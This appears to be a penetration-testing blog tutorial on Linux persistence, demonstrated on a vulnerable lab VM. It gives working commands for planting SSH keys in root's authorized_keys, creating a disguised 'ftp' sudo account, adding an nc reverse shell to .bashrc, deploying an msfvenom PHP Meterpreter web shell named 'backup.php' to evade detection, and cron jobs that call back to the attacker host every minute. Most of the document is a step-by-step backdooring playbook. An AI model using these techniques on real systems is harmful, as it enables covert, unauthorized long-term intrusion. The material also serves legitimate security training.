---
title: "Persistence Techniques"
date: "2025-09-07"
summary: "Set Up and Maintain Persistent Access on Linux Targets Using SSH Keys, Web Shells, and Cron Jobs"
tags: ["persistance", "SSH Keys", "Cron Jobs"]
---


## 1. Prerequisites and Lab Setup

To follow along with the tools and techniques utilized in this scenario, you will need to use one of the following offensive Linux distributions:

* Kali Linux
* Parrot OS

The demonstrations outlined in this scenario were performed against a vulnerable Linux VM designed to teach the process of exploitation and privilege escalation. If you want to follow along, you can download the target VM here: [Raven: 1 (VulnHub)](https://www.vulnhub.com/entry/raven-1,256/).

To get the most out of this scenario, it is recommended to have the following technical prerequisites:

* Familiarity with Linux system administration.
* A functional knowledge of TCP/IP and networking.
* Familiarity with penetration testing concepts and the attack life-cycle.

> **Note:** The techniques and tools demonstrated in this scenario were performed using a Kali Linux Virtual Machine.

---

## 2. MITRE ATT&CK Persistence Techniques

**Persistence** refers to the techniques used to maintain access to a compromised system across reboots, password changes, and other events that might otherwise terminate an attacker's session. This is typically achieved by creating alternative methods of access or modifying the system to automatically restore access when needed.

Gaining an initial foothold alone is not sufficient. To ensure continued access to the target, it is important to establish reliable persistence mechanisms. In this section, we will explore several common Linux persistence techniques, including **SSH authorized keys**, **web shells**, and **cron jobs**.

![Persistance Techniques](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image1.png?raw=true)

The techniques covered under the **Persistence** tactic provide a structured approach to establishing and maintaining long-term access to a compromised Linux system.

In this section, we will explore the following persistence techniques:

* `1.` Account manipulation
* `2.`Persistence using SSH authorized keys
* `3.`Creating a privileged local user account
* `4.`Unix shell configuration modification
* `5.`Backdooring the `.bashrc` file
* `6.`Web shells and backdoors
* `7.`Cron jobs

---

## 3. Scenario

Having successfully obtained **root** privileges on the target system, our objective is to establish **persistence** to ensure continued access even if the current session is terminated or credentials are changed.

> **Note:** Many Linux persistence techniques require **root** privileges. Since we have already escalated our privileges, we can demonstrate these techniques without further restrictions.

## 4. Persistence via SSH Authorized Keys

The first persistence technique we will explore is **SSH key-based authentication** as an alternative to password-based authentication. This technique allows us to maintain access to the target system even if the user's password is changed, which is a common security practice in organizations with password rotation policies.

> **Note:** This technique requires **Public Key Authentication** to be enabled in the SSH configuration. More information can be found here:
> **https://www.linode.com/docs/guides/use-public-key-authentication-with-ssh/**

To perform this technique, you must first obtain access to the target system. **Root** privileges are recommended, as they allow you to modify the SSH configuration and install SSH keys for any user.

Before proceeding, it is important to verify that the SSH server supports **public key authentication**. This can be done by reviewing the **`sshd_config`** file. 

Run this command to view the ssh configuration file:
```bash
nano /etc/ssh/sshd_config
```
![ssh_config](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image2a.png?raw=true)

As shown below, the `PasswordAuthentication` directive is not explicitly disabled, indicating that **password-based SSH authentication is enabled for user accounts**.

![PubkeyAuthentication](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image3.png?raw=true)

We can also observe that **`PermitRootLogin`** is configured as **`without-password`**, meaning the **root** user cannot authenticate with a password but can still log in using SSH keys. This configuration makes **SSH authorized keys** an effective persistence mechanism.

![PermitRootLogin](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image2.png?raw=true)

With the SSH configuration verified, the next step is to generate an **SSH key pair** on the **Kali Linux** machine, as this is the system that will be used to authenticate to the target via SSH. This can be done by running the following command:
```bash
ssh-keygen
```
As shown in the following screenshot, you will be prompted to specify a location to save the generated **public** and **private** keys, as well as an optional passphrase to protect the private key. For this demonstration, we will accept the default options by pressing **Enter** at each prompt.

![ssh-keygen](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image4.png?raw=true)

After generating the SSH key pair, copy the contents of the **public key** (**`id_rsa.pub`**) from your Kali machine and add it to the **`authorized_keys`** file located in the target user's **`.ssh`** directory. Any public key stored in this file is trusted by the SSH server, allowing authentication with the corresponding private key.

```bash
/root/.ssh/authorized_keys
```
In this case, we will be adding the public key to the “authorized_keys” file of the “root” user.

![public key](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image8.png?raw=true)

**Note: If the `.ssh` directory or the `authorized_keys` file does not already exist on the target system, they must be created before adding the public key. This can be accomplished by running the following commands:**

```bash
1. mkdir ~/.ssh
2. touch ~/.ssh/authorized_keys
```
After adding the contents of the generated **public key** to the **`authorized_keys`** file, the file should contain an entry similar to the one shown in the following screenshot. Once this key is in place, the corresponding **private key** can be used to authenticate to the target system via SSH.

![public key](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image5.png?raw=true)

It is recommended to apply the appropriate permissions to the **`.ssh`** directory and the **`authorized_keys`** file to ensure that SSH accepts the key and to protect it from unauthorized access. This can be done by running the following commands:

```bash
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```
With the public key in place and the correct permissions applied by running the above command
![permission](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image6.png?raw=true)

we can authenticate to the target system using the corresponding **private key** without providing a password, as shown in the following screenshot.

![root login](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image7.png?raw=true)


We have successfully established persistent access using **SSH authorized keys**. As a result, we can continue to authenticate to the target system using the corresponding **private key**, even if the user's password is changed or expires, provided the SSH key remains in the **`authorized_keys`** file.


## 5. Creating A Privileged Local Account

Another common Linux persistence technique is to create a **privileged local user account**. This provides an alternative method of accessing the target system if the credentials for existing user accounts are changed or removed.

One drawback of this technique is that creating a new user account can be easily detected, particularly on systems with only a few user and service accounts. To reduce the likelihood of detection, it is common to choose a username that blends in with existing system or service accounts. In this example, we will create a user account named **`ftp`** so that it appears to be a legitimate service account.

Before creating a new user account, it is good practice to enumerate the existing user accounts on the target system. This helps us understand the current user landscape and select a username that blends in with legitimate users or service accounts.

We can list all user accounts by displaying the contents of the **`/etc/passwd`** file:

```bash
cat /etc/passwd
```

As shown in the following screenshot, the system contains the **`root`**, **`michael`**, and **`steven`** user accounts. We can also observe that **`root`** and **`michael`** use the **Bash** shell (`/bin/bash`), while **`steven`** uses the **Bourne shell** (`/bin/sh`).

![users](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image9.png?raw=true)

Since there is no existing **`ftp`** account, we can safely create one without conflicting with another user.

> **Note:** Creating a new user account requires **root** privileges.

The new user account can be created on the target system by running the following command:

```bash
useradd -m -s /bin/bash ftp
```

This command creates a new user named **`ftp`**, automatically creates a home directory (`-m`), and assigns **Bash** (`/bin/bash`) as the default login shell.

![add user](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image10.png?raw=true)


After creating the account, the next step is to grant it administrative privileges by adding it to the **`sudo`** group. This allows the user to execute commands with elevated privileges when required. This can be done by running the following command:

**[Screenshot: Adding the `ftp` user to the `sudo` group]**

```bash
usermod -aG sudo ftp
```
After granting the account **sudo** privileges, we need to set a password for the new user. This password will be used to authenticate when logging in via SSH or switching to the account. A password can be assigned by running the following command:

![sudo group](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image11.png?raw=true)

```bash
passwd ftp
```
After setting the password, we can verify that the account was created successfully by listing the contents of the **`/etc/passwd`** file. As shown in the following screenshot, the newly created **`ftp`** user is now present in the system's user database.

![password](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image12.png?raw=true)

After creating the account and adding it to the sudo group, we can verify the changes by examining the /etc/passwd file again.

![command](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image13a.png?raw=true)

As shown in the following screenshot, the newly created ftp user is now listed among the system accounts.

Next, we can verify the groups assigned to the ftp user by running the following command:

```bash
groups ftp
```
The output confirms that the ftp user belongs to the sudo group, indicating that it has administrative privileges.

![groups](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image14.png?raw=true)

We can now authenticate to the target system via **SSH** using the newly created user account and its password. Alternatively, we can add our **SSH public key** to the user's **`authorized_keys`** file to enable key-based authentication.

![login](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image15.png?raw=true)

After successfully logging in, we can verify that the account has administrative privileges by executing a command with **`sudo`**.

![command](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image16.png?raw=true)


As shown in the preceding screenshot, the newly created user account has **administrative privileges**, allowing it to execute commands with **`sudo`** without relying on the original user accounts.

This account provides an alternative method of accessing the target system and can be used whenever access to the original accounts is unavailable or undesirable. As long as the account remains on the system, it serves as a persistent backdoor for future access.

## 6. Unix Shell Configuration Modification

Another Linux persistence technique is to modify a user's **`.bashrc`** file. This file is automatically executed whenever an interactive **Bash** shell is started, making it an effective location for executing commands upon user login.

In this example, we will append a **Bash reverse shell** payload to the **`.bashrc`** file. When the user starts a new Bash session, the payload will automatically execute and establish a reverse shell connection to our **Netcat** listener.

First, list the contents of the current directory. As shown in the following screenshot, the **`.bashrc`** file is present in the user's home directory.

![list files](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image21.png?raw=true)

Then  open the **`.bashrc`** file using a text editor:

```bash
nano ~/.bashrc
```
![bashrc](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image17.png?raw=true)

After opening the **`.bashrc`** file, we can append a **Bash reverse shell** payload. Because the **`.bashrc`** file is executed whenever the user starts an interactive Bash session, the payload will automatically run at login and establish a reverse shell connection to our **Netcat** listener.

Add the following command to the end of the **`.bashrc`** file:

```bash
nc -e /bin/bash <kali IP> <PORT> 2>/dev/null &
```

The following command is used to establish a **Netcat reverse shell**:

* `1.` **nc** – Launches the Netcat utility.
* `2.` **-e /bin/bash** – Executes `/bin/bash` and redirects its standard input, output, and error streams through the network connection, providing an interactive shell.
* `3.` **`<KALI_IP>`** – Specifies the IP address of the attacker's machine.
* `4.` **`<PORT>`** – Specifies the TCP port on which the Netcat listener is waiting for incoming           connections.
* `5.` **2>/dev/null** – Redirects the standard error stream (**stderr**) to `/dev/null`, suppressing any error messages.
* `6.` **&** – Executes the command in the background, allowing the shell initialization process to continue normally.


As shown in the following screenshot, replace **`<KALI_IP>`** with the IP address of your Kali machine and **`<PORT>`** with the port on which your **Netcat** listener is configured to accept incoming connections.

![reverse shell](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image18.png?raw=true)

After appending the reverse shell payload to the **`.bashrc`** file, the next step is to start a **Netcat** listener on the Kali machine:

```bash
nc -nvlp <PORT>
```

This command instructs **Netcat** to listen for incoming TCP connections on the specified **`<PORT>`**. 

![listner](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image19.png?raw=true)

When the target user starts a new interactive **Bash** session, the **`.bashrc`** file is executed automatically, causing the reverse shell payload to initiate a connection back to the attacker's listener. Upon a successful connection, an interactive shell is established, as shown in the following screenshot.

![shell](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image20.png?raw=true)

We have successfully established persistence by modifying the **`.bashrc`** file. Since **`.bashrc`** is automatically sourced whenever an interactive **Bash** session starts, the embedded reverse shell payload is executed at login, automatically establishing a connection back to our **Netcat** listener.


## 7. Persistence Via Web Shell

Another common Linux persistence technique is to deploy a **PHP web shell** on the target web server. Since the target is running a **LAMP** stack, we can generate a **PHP Meterpreter reverse TCP** payload and upload it to the web root, providing persistent remote access through the web server.

The first step is to generate the PHP Meterpreter payload using **Msfvenom**:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -e php/base64 -f raw > backup.php
```
In order to evade detection, we will save the payload with a filename of “backup.php”.

![msfvenom](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image22.png?raw=true)

After generating the payload, open **`backup.php`** in a text editor and wrap the payload with PHP opening and closing tags to ensure it is interpreted correctly by the PHP engine:

![backup](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image29.png?raw=true)

The next step is to configure a **Metasploit** handler to receive the incoming **Meterpreter** connection. This can be done by running the following commands:

```bash
msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <KALI-IP>
set LPORT <PORT>
run
```
![metasploit](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image23.png?raw=true)

The next step is to upload the PHP web shell to the target web server. One simple method is to host the payload on the Kali machine using Python's built-in HTTP server:

```bash
sudo python3 -m http.server 80
```
This starts a web server on port 80, making the current directory accessible over HTTP. The target can then retrieve the backup.php payload using a tool such as wget or curl.

![server](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image24.png?raw=true)

In this case, the **`backup.php`** payload will be uploaded to the  to the root of the web server under the **`/var/www/html`** directory. 

First, navigate to the document root using the following command: 
```bash
cd /var/www/html
```

Once in the document root the payload can then be downloaded directly onto the target using a command-line utility such as **`wget`** or **`curl`**.

```bash
wget http://<KALI-IP>/backup.php
```
This command retrieves the backup.php payload from the attacker's HTTP server and saves it to the current directory on the target system.

In this case, the `backup.php` is downloaded in `/var/www/html`, making it accessible through the web server and executable when requested via a web browser.

![uploaded](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image26.png?raw=true)

After downloading the payload, assign the appropriate permissions to the file:

```bash
chmod +x backup.php
```
This ensures that the backup.php file has execute permissions before it is accessed through the web server.

![permission](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image27.png?raw=true)

Files placed in this directory are served by the web server and can be accessed over HTTP, allowing the payload to be executed when the file is requested through a web browser. 

We can retrieve a meterpreter session on the target by navigating to the “backup.php” file on the webserver by accessing the following URL with your browser:

```bash
http://<SERVER-IP>/backup.php
```
Accessing **`backup.php`** through a web browser causes the web server to execute the embedded PHP payload. If the **Metasploit** handler is actively listening, the payload initiates a reverse TCP connection back to the attacker's machine, resulting in a **Meterpreter** session, as shown in the following screenshot.

![uploaded](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image28.png?raw=true)


We have successfully established persistence by deploying a **PHP Meterpreter web shell** on the target web server. This provides an alternative access mechanism that does not rely on **SSH** authentication. As long as the payload remains on the server, requesting **`backup.php`** will establish a new **Meterpreter** session.



## 8. Persistence Via Cron Jobs

Another common Linux persistence technique is to leverage **Cron jobs** to automatically execute a command or script at predefined intervals. By scheduling a reverse shell payload, access to the target system can be re-established periodically without requiring user interaction.

**Cron** is a time-based job scheduler that executes commands, scripts, and programs according to schedules defined in the user's **crontab** file.

To create or edit a user's scheduled tasks, open the **crontab** file by running:

```bash id="w0v2y3"
crontab -e
```

Next, add the following entry to execute a **Netcat reverse shell** every minute:

```bash id="61r3b4"
* * * * * nc <KALI_IP> <PORT> -e /bin/bash
```

The five asterisks (`* * * * *`) instruct **Cron** to execute the command **every minute**. Each time the job runs, **Netcat** initiates a reverse shell connection to the attacker's machine, provided a listener is active on the specified **`<PORT>`**.

![nc](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image30.png?raw=true)

After adding the Cron job, save and exit the **crontab** file. If the operation is successful, **Cron** will install the updated crontab and display a confirmation message similar to the one shown in the following screenshot.

![nc](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image31.png?raw=true)

We can now set up our netcat listener by running the following command on Kali:

```bash
nc -nvlp <PORT>
```

After approximately one minute, the scheduled **Cron** job will execute automatically. If the **Netcat** listener is active on the attacker's machine, the reverse shell payload will establish a connection, providing an interactive shell on the listener, as shown in the following screenshot.

![nc](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image32.png?raw=true)


Alternatively, instead of scheduling a **Netcat** reverse shell, the Cron job can be configured to execute the **PHP Meterpreter web shell** created in the previous section. This causes the PHP payload to run automatically at the specified interval, establishing a **Meterpreter** session whenever the **Metasploit** handler is listening.

The following entry can be added to the **crontab** file:

```bash
* * * * * php /var/www/html/backup.php
```

![php](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image33.png?raw=true)


As shown in the following screenshot, after one minute, you should receive a meterpreter session.

![metasploit](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/persistance/image34.png?raw=true)

We have successfully established persistence on the target system by creating a **Cron** job that periodically executes a reverse shell payload. As an alternative, we also configured a **Cron** job to execute the **PHP Meterpreter web shell**, allowing us to automatically re-establish a **Meterpreter** session whenever the scheduled task runs and the **Metasploit** handler is listening.
